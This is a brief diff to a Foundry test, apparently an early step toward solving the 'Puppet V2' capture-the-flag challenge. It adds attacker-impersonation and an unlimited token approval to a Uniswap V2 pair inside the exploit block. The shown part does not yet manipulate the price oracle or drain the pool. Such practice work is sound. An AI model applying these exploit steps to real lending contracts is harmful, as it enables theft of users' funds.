@@ -119,7 +119,10 @@ contract PuppetV2 is Test {
     function testExploit() public {
         /** EXPLOIT START **/
         uint256 bait = puppetV2Pool.calculateDepositOfWETHRequired(POOL_INITIAL_TOKEN_BALANCE);
-        console.log(bait);
+        console.log(bait / 1 ether);
+        vm.startPrank(attacker);
+        dvt.approve(address(uniswapV2Pair), type(uint256).max);
+        vm.stopPrank();
         /** EXPLOIT END **/
         validation();
     }
